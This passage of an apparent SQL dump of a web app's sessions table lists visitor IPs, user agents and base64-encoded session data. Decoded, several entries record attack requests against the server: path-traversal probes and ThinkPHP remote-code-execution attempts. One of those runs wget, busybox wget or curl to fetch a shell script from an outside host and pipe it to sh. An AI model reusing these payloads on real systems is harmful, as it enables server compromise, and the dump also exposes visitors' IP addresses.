Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiaHppUTRRcFBiWFg1WDZneWszcjR0dEJjZ29lZ0IzWG5GVWduUFd4dCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763736186),('Es0k7YTfcS6FKCFIee2e9FypUeKSJ97JF82dzOzB',NULL,'5.187.35.21','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiSlNUNG5aaUF3cmtTcExhdDFZcUNOVFpUM3h0eXZPZEtEdDBUZUVwTiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763767526),('FGZVVok413s5DSjh46j0q5U7QeFgotddzT7YUP7I',NULL,'177.43.59.131','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTkhpS0FSa2FlenBObTdJMGJIUndBSzZlYnlmWkJSQWh1QmgzdVVmMyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6ODk6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9pbmRleC5waHA/bGFuZz0uLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGdG1wJTJGaW5kZXgxIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763791384),('fyLAqwGO6v5jSXQ3GoWH3PV2BHSTnjFmtrLLMIVg',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiV0dXYmVDcmN5NGtmZW1GRVV6NEdRUm1LQkpYYkxCaWdZWE1SYkMwSSI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763757802),('G6NwItm2EINFhLZ3IRyoWIHdsQd8TtCwyg95fCVe',NULL,'8.219.209.185','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTWF2Q3lmMTd4QjdpQmhLQXhQNFBTaHA4S1BremRBWnVaNGJNWTFZRiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly9wYXNzcG9ydC5iYWlkdS5jb20iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763774747),('Gf4nc1ImbnsAE9sHuGzUghgJdKbpqkIw4oOMa3SK',NULL,'194.42.196.91','Go-http-client/1.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUnZtWVJuYlhNaHFROEpGZTdxYWRCRDNSc3pwRXMwaWhHc2lKUXhDNiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763769822),('GmlvEwLfsdYn7fyJo2cPvWBJ0mIme9J3K9Ins1lG',NULL,'49.51.245.241','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoicDFpeFc5VnZHMWZYWHhqQ0J4dElWaDJFQUcxOVl1bVkwYTBWanhZYSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763761033),('HfbCRgz829q6IQCTEO7tNSeNsMslSejgTW5J5gkA',NULL,'87.236.176.141','Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiZzk5SlpreFlnRG9SSWdUUTdpM2QxREFoVVZjamQ4VThxdXMyNjhsRCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763784872),('HzD2czo7gXBF97rkOTvbhoVvZxkeQ028KCg6qXiW',NULL,'198.235.24.37','Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity','YTozOntzOjY6Il90b2tlbiI7czo0MDoic0l1UUFoQ0N3OUNMamZLdWRmUmt6c3l1UThhcnpaSk0xc051MG1sSyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763758017),('i6uqBlGT2BYw3990YyVmNzxrSpIYsGRkUE1VCiNg',NULL,'161.248.201.64','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoib1QxOGNkekg4VUdJd0Y0dTJXcG55ZjlZVEp4RDJPZ1p6REZ6N0NsOCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6ODk6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9pbmRleC5waHA/bGFuZz0uLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGdG1wJTJGaW5kZXgxIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763796716),('IQg6MXGNPA6impQrHhls5KzDtvwr9PqWJTNJUCsw',NULL,'59.27.0.185','curl/7.88.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTU0yTTRUNGZocjJRNzB4SXFlVzc5aTU4alptYVVXeWZaRVZOV3JFSiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763773340),('iYFfbZbCiuGPsXQDZPBmWZcQnGq0ojzZ8vZFC7wW',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiT0U5c0RlMk93NnlwQXVYbDVlOUxVNDJqYnlUaU9QMzVQbHRlQlZ5ZCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763793495),('j6l8SDzeMzgPGM57o2pfhwJwXjoTgY4pGKBCILSE',NULL,'13.210.13.27','Go-http-client/1.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoib2k5b2RGbXg4c0hqbUVpMkFGd1cyY1JTS081alRFS3p5V0drNUMzTyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763729797),('JDqLtPSf0GPTqQmpsIF0MvbPj7vdzam4J5einOe5',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiZ3FPM2pqcjd6aGF2SDhaYlYyOXg2bmJzd2lSeldoaTNKYjRxbnNlQyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763773199),('JIInSbYzYKBH3so92BbdGVbapnjAtBXsc0aD1LkI',NULL,'194.42.196.91','Go-http-client/1.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUnBEMEgyR0NURXIyWHpndTNjcExqeU42Rjl2RXQxTTd1dTBvSWlyQiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763769907),('K5ZpsGBG6YZhBmYWSsO2piaMqh10q4XrcvpfjjgB',NULL,'185.242.226.113','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiS3N5eGZPd0Z0ZUtSRVQ2TzJXRTZGN1FDZXpvTmZjMjNLblpJd3VKdSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763788133),('KAZs65fKPh5S0In3bLZRJScKKCWZvhYkdKHlt5F7',NULL,'43.130.91.95','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiOG11U2ltbVR5SGFFQXBUdWlMU0pFMkdhS29BMzZidW1WOGFobTVnbyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763788331),('kE1QrGzHDMCMiWLgJwT6v6deYjhEk5n2Jqnbn6LI',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiSDRqOFRiQllWR0VsN1B3bW1GYnFsbXhIcWVoQkhPZzd4N3VOVWoxWCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763768220),('L3i5VgYsRrCl4cST68B2hYVONbD6aifS1QPVcdzx',NULL,'104.218.164.192','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoiNmtLNzJKaWJGUlRnbFhkVllSdzlyWkN4aGFNZElHMXZUSjNWR01ZNCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763745745),('LEOPnDy7EiSNLRu8vjHLY5KbsZabkji6yv6T685F',NULL,'212.11.64.45','Go-http-client/1.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiVzNwRzBRQ2tCZnlSRDd1VXhYZjc4eGNXMWtPbkxXQUxETGZDOXFRRCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763747176),('LfDxpvdabyTeNDPkRaF2zv2j73GSxHop53544sZo',NULL,'185.142.236.41','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiVFU4QThNNGtrak5wYU1QejlUNVdBdU5hV1RwZW1PZlJSZzJ6M0tYYyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763764765),('ljx3r1KjOc0J9VbZMvnsPCTvtjftqwTAU0pInzuW',NULL,'185.242.226.113','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiNk9sVXJvN2o4TjVSdFY5ZE9BU2d5dDVlcnk2VDJDaFhCc0lNS3BBMyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763760333),('LyK9Iyf3x8x4ygRUbCKe9Bvnv2GfZfDexYa6WiZO',NULL,'138.84.115.19','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiRVBGWm9XOUF6enhZNFNPczg4NThReDIwTDZ0UnVDYm1CMGg1NDVMTCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763808181),('manGViarkBvdvVnSadtbJfDoAPndnQzrulK4AdA5',NULL,'192.159.99.95','Mozilla/5.0 (rondo2012@atomicmail.io)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUnh2ZGlPWGtOMUczVzJkUW9SRmJ4QzBROGhzTmRlUDlwSERjbmhQSyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzQxOiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwP2Z1bmN0aW9uPWNhbGxfdXNlcl9mdW5jX2FycmF5JnM9JTJGSW5kZXglMkYlNUN0aGluayU1Q2FwcCUyRmludm9rZWZ1bmN0aW9uJnZhcnMlNUIwJTVEPXN5c3RlbSZ2YXJzJTVCMSU1RCU1QjAlNUQ9JTI4d2dldCUyMC1xTy0lMjBodHRwJTNBJTJGJTJGNzQuMTk0LjE5MS41MiUyRnJvbmRvLnR4Zy5zaCU3QyU3Q2J1c3lib3glMjB3Z2V0JTIwLXFPLSUyMGh0dHAlM0ElMkYlMkY3NC4xOTQuMTkxLjUyJTJGcm9uZG8udHhnLnNoJTdDJTdDY3VybCUyMC1zJTIwaHR0cCUzQSUyRiUyRjc0LjE5NC4xOTEuNTIlMkZyb25kby50eGcuc2glMjklN0NzaCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763777078),('md7BSouE6rxP90RzJxKARmshUlDGMY8xexkq5fOj',NULL,'118.17.213.1','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiejR5Q3VkSTl1bXd0bTFUS3ZMQlJsYnZDTktVUVZsd3Njb3pPeTVlUiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763774355),('mhxuffl5wZBorbEnEbFXwTGVzblU6iIyWLbu2iXe',NULL,'1.37.67.196','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/6.8.3 Chrome/122.0.0.0 Safari/537.36','YTo0OntzOjY6Il90b2tlbiI7czo0MDoiNUlUVG9SOE5HWWM2bHc3d3JUcUFFNlNQRkVocHFhdTZkRVBDdU5obCI7czozOiJ1cmwiO2E6MTp7czo4OiJpbnRlbmRlZCI7czo0MToiaHR0cDovLzEzOS41OS4yNTIuMTAwL2Zyb250ZGVzay9kYXNoYm9hcmQiO31zOjk6Il9wcmV2aW91cyI7YToxOntzOjM6InVybCI7czoyNzoiaHR0cDovLzEzOS41OS4yNTIuMTAwL2xvZ2luIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763727612),('MjQoYaJnL9NqESYM3HwvsKt8pyPvhAvlsSlJT64C',NULL,'43.166.244.251','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiWXlacGNsYWVnYW9Xd1A5WXRBQm4yb01RUFpXa3JlZzJ0Nnl1MzdNNSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763802969),('mo4kOzVFc3wpsotdF3ikT3OAiH9BmiF1hxUtXhSj',NULL,'89.248.167.131','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiVDk2ZWtqZ0xFYzJaOVhmRG5XNEhaZnlIVlFKVVNMWkRIWUtIV1R5ayI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763754346),('nEDLVIs2pfOrTfsTYOqmOEX1B74X5W0m4LnCpkNO',NULL,'217.160.24.82','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoicHpYaWswSjZZbFI0QXFCUjNRVHhjSDdvV3ZoU09oMjhsUFFPOEtjYyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763732546),('nfh9SH4pPLhoC3HVIop0vH2kbPS0NaYZXMyjszvs',NULL,'91.231.89.211','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoiS1piTXpiYlUxTzVPWlRVT3QxYjJGRkduSXlzQnd4bW1Sdm5rbTRhNSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763770067),('nfT6Wa1iFk5KgBBWxmQXaLjCGN7uX7VLVqrr2nxF',NULL,'202.64.45.197','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiaGx6V1NYdTBkSnY4SVh6RU1DRFlJQndtMllzMVpiaGNvNEE3eFRWRyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6ODk6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9pbmRleC5waHA/bGFuZz0uLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGdG1wJTJGaW5kZXgxIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763730759),('nJyxdKw8nEOo8rM5XzU9EVRTuZoDU0wUcFQUJMs3',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiN3NUVFVYdklmQzVGaHFVYzVLcUtVenJrTWFHUDZzMWRlcDV6VDEzNiI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763752832),('NNsaufAuifeEMZAvdJJz9E9bEm6WOYqrognL4Bu4',NULL,'192.159.99.180','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiRmxEenBpTjRIYU5kNGFwUTgyeWpVU0FMTnJTdXVzaFVhb3NFRnNmTyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763740509),('nYLmHRjKvnIEJAEvwKymGs90ujxkmad7EzuynOs8',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiZnBaalZaUkU4SnVtSHBtRWREdHVOVEZBaEU3VlBwRE13dTRRMGlGbSI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763778292),('o2QE6VSpanEE6DKh22s0qXnAaL4rg7KaCDrxq1sh',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiMzh1enh4OU1RMGpyRGxZTjlBbzllQmVRRkg0MG9wR1l4NnRVU1pHeCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763798483),('oc03F93K3CB0pC1NYdG4wiKNGwzFORhYSEK2iCHS',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiUGZ3TTVabllVVHBqa1NDUWxWZjNLMzBMR0k3VFlQV0JmUVJLM2FkbiI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763783364),('pK4emfikz8UwQbPpGFiRlfjTNlJyyscyqXfIRBN0',NULL,'194.42.196.91','Go-http-client/1.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiQzBDVzgxQ1NnV2VDVU1qcERvSnJnOXM3dXVSMnhZeGZwNFB3MEh2eCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763770544),('pzAFVo0FGz6Nw6mXALq7mCMMwhLGdK072QdqHqPK',NULL,'206.168.34.53','Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUTZLaUJvTjljM1FiYXpydmtRZU1rY0xhNDFlR1llaFo5NGZOdEk4ZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763763163),('qB66hi1qkZkmHpmP33LwoPyQlIhwQgD5vWjE0BDh',NULL,'43.130.100.35','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUVg0Z0FHNE9vODduMktoTjFuNnBOS2FVYlVUZHROV2RnNXZMc3RFdCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjc6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9sb2dpbiI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763763515),('QZnWtRl3TvbDTDTZMZQjPoHYB1rjXtGg9A5mxFK8',NULL,'161.248.201.64','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiOVdWOUc2U0VNTjdKczNWVUhQUXZwcVM3ckdmVDIyYVVLZGIyQTdWRyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTQ3OiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwP2Z1bmN0aW9uPWNhbGxfdXNlcl9mdW5jX2FycmF5JnM9JTJGaW5kZXglMkYlNUN0aGluayU1Q2FwcCUyRmludm9rZWZ1bmN0aW9uJnZhcnMlNUIwJTVEPW1kNSZ2YXJzJTVCMSU1RCU1QjAlNUQ9SGVsbG8iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763796715),('r4d7Wkpsq42cYh7BaLJRDbGjdQLTNnyUMzzSFCiW',NULL,'194.164.107.4','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiMTVmbllJYnZHbTR2aE5mWjEzY1l6N2drdXo3eU5Yb0ttNU8wZmpmUiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763753833),('RJouPwFNu5NpsYC9KsCGFSnmIEGHJGTHz5Zizl8A',NULL,'176.65.148.246','Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoiRHZmeVJtb0oxRE1CaGVYMGZsSUlIbWRDQWtRajVUQndmNGRDS3pzYiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763730083),('rjvnEFsUFmiusQLN7wkGGHRjxInpu90GhcKK9HXc',NULL,'173.252.79.6','facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiWUtoTjFXQW5WSjhtSlFNMkdtSUFuY214T0wyOUF1U1llMnVPVHk5ZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763727658),('RxG6RzSsl4X7lptWu4RIY3AM8jWetxbKEZdsjt95',NULL,'206.168.34.37','Mozilla/5.0 (compatible; CensysInspect/1.1; 